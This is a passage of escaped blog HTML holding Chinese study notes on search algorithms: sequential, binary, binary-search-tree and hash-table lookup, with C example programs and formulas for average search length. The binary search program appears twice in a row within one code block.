class=\"hljs-number\">55</span>,<span class=\"hljs-number\">73</span>,<span class=\"hljs-number\">64</span>,<span class=\"hljs-number\">77</span>&#125;;<br>    SQT.elem=Data;<br>    SQT.length=<span class=\"hljs-number\">9</span>;<br>    index=Search_Seq(SQT);<br>&#125;<br><span class=\"hljs-comment\">//若找不到报错，检查scanf函数是否添加了&amp;符号v(#｀-_ゝ-)</span><br><br></code></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"二、折半查找-静态\"><a href=\"#二、折半查找-静态\" class=\"headerlink\" title=\"二、折半查找(静态)\"></a>二、折半查找(静态)</h2><p>必须使用顺序存贮且元素按照关键字升序；</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> MAXSIZE 100</span><br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-type\">int</span> keyType;<br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span></span><br><span class=\"hljs-class\">&#123;</span><br>    keyType key;<br>&#125;SElemType;<br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span></span><br><span class=\"hljs-class\">&#123;</span><br>    SElemType *elem;<br>    <span class=\"hljs-type\">int</span> length;<br>&#125;SeqTable;<br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">SearchBin</span><span class=\"hljs-params\">(SeqTable ST)</span><br>&#123;<br>    <span class=\"hljs-type\">int</span> low,mid,high;<br>    low=<span class=\"hljs-number\">0</span>;<br>    high=ST.length<span class=\"hljs-number\">-1</span>;<br>    keyType target;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Enter the target:&quot;</span>);<br>    <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;target);<br>    <span class=\"hljs-keyword\">while</span>(low&lt;=high)<br>    &#123;<br>        mid=(low+high)/<span class=\"hljs-number\">2</span>;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;low:%d,mid:%d,high:%d\\n&quot;</span>,low,mid,high);<br>        <span class=\"hljs-keyword\">if</span>(target==ST.elem[mid].key)<br>        &#123;<br>            <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Find in position %d.&quot;</span>,mid);<br>            <span class=\"hljs-keyword\">return</span> mid;<br>        &#125;<br>        <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(target&lt;ST.elem[mid].key)<br>        &#123;<br>            high=mid<span class=\"hljs-number\">-1</span>;<br>        &#125;<br>        <span class=\"hljs-keyword\">else</span><br>        &#123;<br>            low=mid+<span class=\"hljs-number\">1</span>;<br>        &#125;<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">-1</span>;<br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span><br>&#123;<br>        SeqTable T;<br>        <span class=\"hljs-type\">int</span> index;<br>        SElemType DATA[MAXSIZE]=&#123;<span class=\"hljs-number\">10</span>,<span class=\"hljs-number\">13</span>,<span class=\"hljs-number\">15</span>,<span class=\"hljs-number\">20</span>,<span class=\"hljs-number\">65</span>,<span class=\"hljs-number\">66</span>,<span class=\"hljs-number\">90</span>,<span class=\"hljs-number\">100</span>,<span class=\"hljs-number\">120</span>&#125;;<br>        T.elem=DATA;<br>        T.length=<span class=\"hljs-number\">9</span>;<br>        index=SearchBin(T);<br>        <span class=\"hljs-keyword\">if</span>(index==<span class=\"hljs-number\">-1</span>)<br>        &#123;<br>            <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;No such a data.\\n&quot;</span>);<br>        &#125;<br>&#125;<br><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> MAXSIZE 100</span><br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-type\">int</span> keyType;<br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span></span><br><span class=\"hljs-class\">&#123;</span><br>    keyType key;<br>&#125;SElemType;<br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span></span><br><span class=\"hljs-class\">&#123;</span><br>    SElemType *elem;<br>    <span class=\"hljs-type\">int</span> length;<br>&#125;SeqTable;<br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">SearchBin</span><span class=\"hljs-params\">(SeqTable ST)</span><br>&#123;<br>    <span class=\"hljs-type\">int</span> low,mid,high;<br>    low=<span class=\"hljs-number\">0</span>;<br>    high=ST.length<span class=\"hljs-number\">-1</span>;<br>    keyType target;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Enter the target:&quot;</span>);<br>    <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;target);<br>    <span class=\"hljs-keyword\">while</span>(low&lt;=high)<br>    &#123;<br>        mid=(low+high)/<span class=\"hljs-number\">2</span>;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;low:%d,mid:%d,high:%d\\n&quot;</span>,low,mid,high);<br>        <span class=\"hljs-keyword\">if</span>(target==ST.elem[mid].key)<br>        &#123;<br>            <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Find in position %d.&quot;</span>,mid);<br>            <span class=\"hljs-keyword\">return</span> mid;<br>        &#125;<br>        <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(target&lt;ST.elem[mid].key)<br>        &#123;<br>            high=mid<span class=\"hljs-number\">-1</span>;<br>        &#125;<br>        <span class=\"hljs-keyword\">else</span><br>        &#123;<br>            low=mid+<span class=\"hljs-number\">1</span>;<br>        &#125;<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">-1</span>;<br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span><br>&#123;<br>        SeqTable T;<br>        <span class=\"hljs-type\">int</span> index;<br>        SElemType DATA[MAXSIZE]=&#123;<span class=\"hljs-number\">10</span>,<span class=\"hljs-number\">13</span>,<span class=\"hljs-number\">15</span>,<span class=\"hljs-number\">20</span>,<span class=\"hljs-number\">65</span>,<span class=\"hljs-number\">66</span>,<span class=\"hljs-number\">90</span>,<span class=\"hljs-number\">100</span>,<span class=\"hljs-number\">120</span>&#125;;<br>        T.elem=DATA;<br>        T.length=<span class=\"hljs-number\">9</span>;<br>        index=SearchBin(T);<br>        <span class=\"hljs-keyword\">if</span>(index==<span class=\"hljs-number\">-1</span>)<br>        &#123;<br>            <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;No such a data.\\n&quot;</span>);<br>        &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"三、二叉排序树查找（动态）\"><a href=\"#三、二叉排序树查找（动态）\" class=\"headerlink\" title=\"三、二叉排序树查找（动态）\"></a>三、二叉排序树查找（动态）</h2><p>二叉树中所有的左孩子小于其父节点，右孩子大于其父节点</p>\n<p>若根节点的左右子树高度差不超过1，则称为平衡二叉树；ASL=log2（n）</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span><br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-type\">int</span> keyType;<br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">BTNode</span></span><br><span class=\"hljs-class\">&#123;</span><br>    keyType key;<br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">BTNode</span> *<span class=\"hljs-title\">lchild</span>,*<span class=\"hljs-title\">rchild</span>;</span><br>&#125;BTNode,*BiTree;<br><br>BiTree <span class=\"hljs-title function_\">SearchBSTree</span><span class=\"hljs-params\">(BTNode *T,keyType key)</span><br>&#123;<br>    <span class=\"hljs-keyword\">if</span>(!T||key==T-&gt;key) <span class=\"hljs-keyword\">return</span> T;<br>    <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(key&lt;T-&gt;key) <span class=\"hljs-keyword\">return</span>(SearchBSTree(T-&gt;lchild,key));<br>    <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">return</span>(SearchBSTree(T-&gt;rchild,key));<br>&#125;<br><br>BTNode *<span class=\"hljs-title function_\">SearchBST</span><span class=\"hljs-params\">(BTNode *T,keyType key,<span class=\"hljs-type\">int</span> *flag)</span><br>&#123;<br>    BTNode *p,*pre;<br>    <span class=\"hljs-comment\">//flag==1，查找成功，返回该元素节点；否则查找失败，返回访问的最后一个节点；</span><br>    *flag=<span class=\"hljs-number\">0</span>;<br>    <span class=\"hljs-keyword\">if</span>(!T)<br>    &#123;<br>        *flag=<span class=\"hljs-number\">0</span>;<br>        <span class=\"hljs-keyword\">return</span> T;<br>    &#125;<br>    p=T;<br>    pre=T;<br>    <span class=\"hljs-keyword\">while</span>(p!=<span class=\"hljs-literal\">NULL</span>&amp;&amp;key!=p-&gt;key)<br>    &#123;<br>        pre=p;<br>        <span class=\"hljs-keyword\">if</span>(key&lt;p-&gt;key) p=p-&gt;lchild;<br>        <span class=\"hljs-keyword\">else</span> p=p-&gt;rchild;<br>    &#125;<br>    <span class=\"hljs-keyword\">if</span>(p!=<span class=\"hljs-literal\">NULL</span>&amp;&amp;key==p-&gt;key)<br>    &#123;<br>        *flag=<span class=\"hljs-number\">1</span>;<br>        <span class=\"hljs-keyword\">return</span> p;<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span><br>    &#123;<br>        *flag=<span class=\"hljs-number\">0</span>;<br>        <span class=\"hljs-keyword\">return</span> pre;<br>    &#125;<br>&#125;<br><br>BTNode *<span class=\"hljs-title function_\">InsertBSTNode</span><span class=\"hljs-params\">(BTNode *T,keyType key)</span><br>&#123;<br>    BTNode *p,*s;<br>    <span class=\"hljs-type\">int</span> flag=<span class=\"hljs-number\">0</span>;<br>    <span class=\"hljs-comment\">//查找是否存在相同节点</span><br>    p=SearchBST(T,key,&amp;flag);<br>    <span class=\"hljs-keyword\">if</span>(!flag)<br>    &#123;<br>        s=(BTNode*)<span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-keyword\">sizeof</span>(BTNode));<br>        s-&gt;key=key;<br>        s-&gt;lchild=s-&gt;rchild=<span class=\"hljs-literal\">NULL</span>;<br>        <span class=\"hljs-keyword\">if</span>(!p)<br>        &#123;<br>            <span class=\"hljs-keyword\">return</span> s;<br>        &#125;<br>        <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(key&lt;p-&gt;key) p-&gt;lchild=s;<br>        <span class=\"hljs-keyword\">else</span> p-&gt;rchild=s;<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span> T;<br>&#125;<br><br>BiTree <span class=\"hljs-title function_\">Create</span><span class=\"hljs-params\">(keyType key)</span><br>&#123;<br><br>    BiTree T;<br>    T=(BTNode*)<span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-keyword\">sizeof</span>(BTNode));<br>    <span class=\"hljs-keyword\">if</span>(T==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Asaign the memory failurely.&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    T-&gt;key=key;<br>    T-&gt;lchild=T-&gt;rchild=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-keyword\">return</span> T;<br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">VisitNode</span><span class=\"hljs-params\">(keyType key)</span><br>&#123;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,key);<br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">InorderTree</span><span class=\"hljs-params\">(BiTree T)</span><br>&#123;<br>    <span class=\"hljs-keyword\">if</span>(T!=<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        InorderTree(T-&gt;lchild);<br>        VisitNode(T-&gt;key);<br>        InorderTree(T-&gt;rchild);<br>    &#125;<br>&#125;<br><br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span><br>&#123;<br><br>    BTNode *ST;<br>    keyType mykey;<br>    <span class=\"hljs-type\">int</span> index,nums;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Enter the nodes&#x27; number:&quot;</span>);<br>    <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;nums);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Please enter the root&#x27;s data:&quot;</span>);<br>    <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;mykey);<br>    ST=Create(mykey);<br><br>    <span class=\"hljs-keyword\">for</span>(index=<span class=\"hljs-number\">1</span>;index&lt;nums;index++)<br>    &#123;<br>        keyType tmp_key;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Please enter the %d node:&quot;</span>,index);<br>        <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;tmp_key);<br>        ST=InsertBSTNode(ST,tmp_key);<br>    &#125;<br>    InorderTree(ST);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Please enter the target data:&quot;</span>);<br>    <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;mykey);<br>    ST=SearchBSTree(ST,mykey);<br>    <span class=\"hljs-keyword\">if</span>(!ST)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;No such a data.\\n&quot;</span>);<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span><br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Find it:%d!&quot;</span>,mykey);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"四、哈希表\"><a href=\"#四、哈希表\" class=\"headerlink\" title=\"四、哈希表\"></a>四、哈希表</h2><h3 id=\"1-适用于动态查找和静态查找\"><a href=\"#1-适用于动态查找和静态查找\" class=\"headerlink\" title=\"1.适用于动态查找和静态查找\"></a>1.适用于动态查找和静态查找</h3><h3 id=\"2-常见哈希函数\"><a href=\"#2-常见哈希函数\" class=\"headerlink\" title=\"2.常见哈希函数\"></a>2.常见哈希函数</h3><p>（1）直接定址：适合连续的分布；</p>\n<p>（2）除留取余：假定哈希表长m,取p&lt;=m，一般选择不大于m的最大质数；</p>\n<h3 id=\"3-处理冲突的方法\"><a href=\"#3-处理冲突的方法\" class=\"headerlink\" title=\"3.处理冲突的方法\"></a>3.处理冲突的方法</h3><p>（1）开放地址：Hi=(H(Key)+di)%m;</p>\n<p>​        i.线性探测法：若计算出的地址冲突，则一次向后顺延；容易造成聚集（堆积），降低查找效率；</p>\n<p>​        ii.平方探测法：若计算出的地址冲突，则一次向后/前顺延i^2个地址；</p>\n<p>（2）链地址：在冲突的数据位置设置链表；</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"一、顺序查找\"><a href=\"#一、顺序查找\" class=\"headerlink\" title=\"一、顺序查找\"></a>一、顺序查找</h2><p>MSL最大查找长度，ASL平均查找长度；</p>\n<p>ASL成功=SumPi（n-i+1） ASL失败=n+1</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span><br><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> MAXSIZE 100</span><br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-type\">int</span> keyType;<br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span></span><br><span class=\"hljs-class\">&#123;</span><br>    keyType key;<br>&#125; SElemType;<br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span></span><br><span class=\"hljs-class\">&#123;</span><br>    SElemType *elem;<br>    <span class=\"hljs-type\">int</span> length;<br>&#125; SeqTable;<br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">Search_Seq</span><span class=\"hljs-params\">(SeqTable ST)</span><br>&#123;<br>    <span class=\"hljs-type\">int</span> index;<br>    keyType key;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Enter the target:&quot;</span>);<br>    <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;key);<br>    ST.elem[ST.length].key=key;<br>    <span class=\"hljs-keyword\">for</span>(index=<span class=\"hljs-number\">0</span>; ST.elem[index].key!=key; ++index);<br>    <span class=\"hljs-keyword\">if</span>(index&lt;ST.length)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Find in %d&quot;</span>,index);<br>        <span class=\"hljs-keyword\">return</span> index;<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">-1</span>;<br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span><br>&#123;<br>    SeqTable SQT;<br>    keyType key;<br>    <span class=\"hljs-type\">int</span> index;<br>    SElemType Data[MAXSIZE]= &#123;<span class=\"hljs-number\">34</span>,<span class=\"hljs-number\">44</span>,<span class=\"hljs-number\">43</span>,<span class=\"hljs-number\">12</span>,<span class=\"hljs-number\">53</span>,<span class=\"hljs-number\">55</span>,<span class=\"hljs-number\">73</span>,<span class=\"hljs-number\">64</span>,<span class=\"hljs-number\">77</span>&#125;;<br>    SQT.elem=Data;<br>    SQT.length=<span class=\"hljs-number\">9</span>;<br>    index=Search_Seq(SQT);<br>&#125;<br><span class=\"hljs-comment\">//若找不到报错，检查scanf函数是否添加了&amp;符号v(#｀-_ゝ-)</span><br><br></code></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"二、折半查找-静态\"><a href=\"#二、折半查找-静态\" class=\"headerlink\" title=\"二、折半查找(静态)\"></a>二、折半查找(静态)</h2><p>必须使用顺序存贮且元素按照关键字升序；</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span 